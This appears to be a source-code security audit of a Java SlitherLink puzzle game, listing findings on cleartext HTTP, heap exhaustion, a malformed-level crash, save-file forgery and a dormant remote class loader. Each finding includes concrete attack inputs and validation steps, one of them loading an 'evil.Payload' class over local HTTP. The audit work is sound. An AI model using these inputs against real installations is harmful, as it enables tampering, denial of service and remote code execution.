findings.title: Shared-level downloads and uploads use cleartext HTTP
findings.code_excerpt:
public final static String HIGHSCORE_GETPHP = "http://www.apo-games.de/apoSlitherLink/get_highscore.php";
public final static String HIGHSCORE_SAVEPHP = "http://www.apo-games.de/apoSlitherLink/save_highscore.php";
findings.entry_point: Startup automatically requests shared levels through ApoSlitherLinkPanel.loadLevels at apoSlitherLink/game/ApoSlitherLinkPanel.java:125-141. A solved editor puzzle is submitted when the Upload button reaches ApoSlitherLinkEditor.mouseButtonFunction at apoSlitherLink/game/ApoSlitherLinkEditor.java:112-121.
findings.sink: ApoHighscore opens URLConnection instances to the HTTP constants and exchanges request/response bodies at org/apogames/help/ApoHighscore.java:63-84 and 109-139.
findings.data_path: Panel initialization at ApoSlitherLinkPanel.java:111-141 calls ApoHighscore.load; editor Upload at ApoSlitherLinkEditor.java:112-121 calls ApoHighscore.save; both resolve the cleartext constants at org/apogames/ApoConstants.java:23-26 before URLConnection.openConnection.
findings.attack_scenario: A network attacker intercepts either HTTP request. For the GET, they replace the response's level lines, which the client adds to the custom-level catalog at ApoSlitherLinkPanel.java:137-139. For the POST, they can observe or alter the level, solution, and name fields assembled at ApoHighscore.java:74-77. The gain is disclosure or manipulation of shared puzzle content, not host code execution.
findings.preconditions: ApoConstants.B_ONLINE remains true as initialized at org/apogames/ApoConstants.java:23, and the endpoint is reachable directly or through an attacker-controlled network path.
findings.validation_plan: Run the game with an intercepting HTTP proxy configured through the JVM http.proxyHost/http.proxyPort properties. Trigger startup and an editor upload. Confirm that the proxy can read and modify the POST parameters and can replace the GET response with a valid three-line record that subsequently appears under Custom.

findings.title: Unbounded HTTP response is retained until heap exhaustion
findings.entry_point: Response bytes from the cleartext get_highscore.php request opened at org/apogames/help/ApoHighscore.java:109-126.
findings.sink: The loop at ApoHighscore.java:129-138 has no response-size, line-length, or record-count limit and retains every line in one of three ArrayLists.
findings.data_path: ApoSlitherLinkPanel.init creates the level I/O object and invokes loadLevels at ApoSlitherLinkPanel.java:111-114; loadLevels starts a thread and calls ApoHighscore.load at lines 133-141; load reads and stores lines at ApoHighscore.java:126-138.
findings.attack_scenario: A malicious server or HTTP interceptor returns an endless sequence of newline-delimited values, or one extremely large unterminated line. The startup thread continually allocates strings and grows the singleton's lists until an OutOfMemoryError or severe garbage-collection thrashing makes the game unusable.
findings.preconditions: Online mode is enabled at ApoConstants.java:23 and the attacker can control or intercept the HTTP response. No player interaction is required after launch.
findings.validation_plan: Proxy get_highscore.php to a local HTTP responder that continuously emits distinct short lines without closing the response. Launch with a small heap such as -Xmx64m. Confirm monotonically increasing heap use followed by OutOfMemoryError in the load thread or an unresponsive game.

findings.title: Malformed downloaded level becomes a negative-sized array
findings.entry_point: The first line of each three-line record returned by get_highscore.php is treated as a user-generated level at ApoHighscore.java:129-136.
findings.sink: ApoSlitherLinkLevel.setLevel catches dimension parsing errors by assigning -1, then uses the negative values as array dimensions at apoSlitherLink/level/ApoSlitherLinkLevel.java:411-425.
findings.data_path: ApoHighscore.load stores the response at ApoHighscore.java:126-138; ApoSlitherLinkPanel adds each level at ApoSlitherLinkPanel.java:135-139; ApoSlitherLinkLevels.addCustomLevel stores it at ApoSlitherLinkLevels.java:177-183; clicking Custom follows ApoSlitherLinkMenu.java:120-123 to ApoSlitherLinkPanel.startCustomLevel at lines 265-269, then ApoSlitherLinkLevel.setCustomLevels at ApoSlitherLinkLevel.java:294-306 and setLevel at lines 407-425.
findings.attack_scenario: A malicious server or HTTP interceptor returns the three lines "x", "ignored", and "attacker". The client stores "x" as the first custom level. When the player clicks Custom, both two-character dimension parses fail and the allocation at line 425 throws NegativeArraySizeException, terminating the uncaught game-update path and freezing normal play.
findings.preconditions: The malicious response must finish loading and the player must click Custom. The attacker must control the shared-level server or the cleartext HTTP path described in ApoSlitherLink-01.
findings.validation_plan:
Intercept get_highscore.php and return exactly "x
ignored
attacker
". Wait for the startup request to complete, click Custom, and confirm NegativeArraySizeException points to ApoSlitherLinkLevel.java:425 and the game stops updating.

findings.title: Editable save file can mark built-in puzzles solved without verification
findings.entry_point: The user-editable relative file highscore.apo, fixed at apoSlitherLink/game/ApoSlitherLinkPanel.java:26 and opened during desktop startup at ApoSlitherLinkPanel.java:125-128.
findings.sink: ApoSlitherLinkLevelIO.checkLevelsIsIn unconditionally invokes setBSolved(true) at line 32 after matching only the public level string; it never proves that the supplied solution solves the puzzle.
findings.data_path: ApoIO opens the file at org/apogames/ApoIO.java:210-229; ApoSlitherLinkLevelIO.readLevel accepts level/solution UTF pairs at lines 70-80; Panel passes them through checkLevelsIsIn at ApoSlitherLinkPanel.java:129-131; line 32 sets the completion flag, which the menu counts at ApoSlitherLinkMenu.java:152-164.
findings.attack_scenario: A local user writes one record containing the built-in level string from ApoSlitherLinkLevels.java:24 and the syntactically valid but empty-edge solution "0404aaaaaaaaaaaaaaaa"; "a" denotes an empty cell at ApoSlitherLinkLevelsHelp.java:13. On restart, the game marks that Easy puzzle solved and increments the displayed completion count without the user solving it.
findings.preconditions: Desktop mode is used and the attacker or cheating user can place highscore.apo in the process working directory before launch.
findings.validation_plan: Use DataOutputStream to create highscore.apo with writeInt(1), writeUTF("0404  32 3     2 0 0"), and writeUTF("0404aaaaaaaaaaaaaaaa"). Launch from that directory and confirm the Easy completion counter is incremented and the first level is shown as solved despite the empty loop.

findings.title: Unbounded save count amplifies into retained preview images
findings.entry_point: The attacker-controlled highscore.apo file opened during desktop startup at ApoSlitherLinkPanel.java:125-128 and org/apogames/ApoIO.java:215-229.
findings.sink: The unchecked count controls the loop at ApoSlitherLinkLevelIO.java:72-80. Panel then invokes addCustomsLevels at ApoSlitherLinkPanel.java:129-132, which creates and retains a solved preview for every unmatched record at ApoSlitherLinkLevelIO.java:42-49; each preview allocates a BufferedImage at ApoSlitherLinkLevelsHelp.java:254-264.
findings.data_path: highscore.apo -> ApoIO.readLevel at ApoIO.java:210-229 -> ApoSlitherLinkLevelIO.readLevel at lines 70-80 -> ApoSlitherLinkPanel.loadLevels at lines 125-132 -> ApoSlitherLinkLevelIO.addCustomsLevels at lines 42-49 -> ApoSlitherLinkLevelsHelp.makeSolvedImage at lines 166-264.
findings.attack_scenario: A local attacker supplies a small save containing thousands of repeated custom records such as level "0101 " and solution "0101a". Duplicates are not filtered in addCustomsLevels at lines 43-49, and each retained helper receives a 200-by-200 ARGB preview at ApoSlitherLinkLevelsHelp.java:10-11 and 254-264. The amplified allocations exhaust the heap before the menu appears.
findings.preconditions: Desktop mode is used and highscore.apo can be replaced in the working directory. A sufficiently large count relative to the JVM heap is required.
findings.validation_plan: Generate highscore.apo with writeInt(1000), followed by 1000 pairs of writeUTF("0101 ") and writeUTF("0101a"). Run with -Xmx64m. Confirm OutOfMemoryError during ApoSlitherLinkLevelsHelp.makeSolvedImage or failure to reach the main menu.

findings.title: Dormant URL class instantiation helper is theoretical
findings.entry_point: There is no application entry point in this variant. The path and class name are accepted by the public constructor at org/apogames/help/ApoClassLoader.java:19-22, but no source file constructs ApoClassLoader or calls getMyClass.
findings.sink: getMyClass creates a URLClassLoader, loads the selected class, and invokes its constructor at ApoClassLoader.java:62-75.
findings.data_path: Theoretical only: a caller would pass path/classname to ApoClassLoader at lines 19-22, getMyClass would convert the path to a file URL or remote URL at lines 62-69, and loadClass/newInstance would execute the selected class at lines 73-75. The shipped ApoSlitherLink main path at ApoSlitherLinkMain.java:27-28 does not do this.
findings.attack_scenario: No attacker-controlled input reaches this helper in the current variant, so there is no reproducible attack through the game UI, network loader, save file, or command line. If future wiring passes an attacker URL while B_APPLET is true, the attacker can serve a class whose constructor executes with the process's Java permissions.
findings.preconditions: A new caller or test harness must invoke the otherwise-unused helper and allow an attacker to control both path and classname.
findings.validation_plan: For a direct component test, compile evil.Payload with a constructor that creates a marker file, serve its package directory over local HTTP, set ApoConstants.B_APPLET=true, and call new ApoClassLoader("http://127.0.0.1:8000/", "evil.Payload").getMyClass(). The marker proves the sink works; a repository call-site search should still confirm it is not reachable from the shipped game.

notes: All 62 Java files under the supplied source root were reviewed. ObjectInputStream/readObject and JNI System.load/loadLibrary are absent. ApoHelp defines an MD5 helper at org/apogames/help/ApoHelp.java:281-294, but it has no call site and is not used to validate saves, levels, or submissions. The applet entry exists at apoSlitherLink/ApoSlitherLinkApplet.java:12-42, but no concrete security-sensitive decision relying on the historical applet sandbox was found. Other HTTP-looking code is dormant here: APPLET_LEVEL at ApoSlitherLinkComponent.java:25-26 has no consumer, and AudioPlayer's HTTP branch at org/apogames/sound/AudioPlayer.java:67-70 cannot be selected because BInJAR is fixed true at line 19 and this variant's loadSound calls are commented at ApoSlitherLinkComponent.java:97-102. Main ignores command-line arguments at ApoSlitherLinkMain.java:27-28. Current availability of the historical apo-games.de endpoints was not required for the source-level reachability conclusions and should be emulated with a proxy for validation.
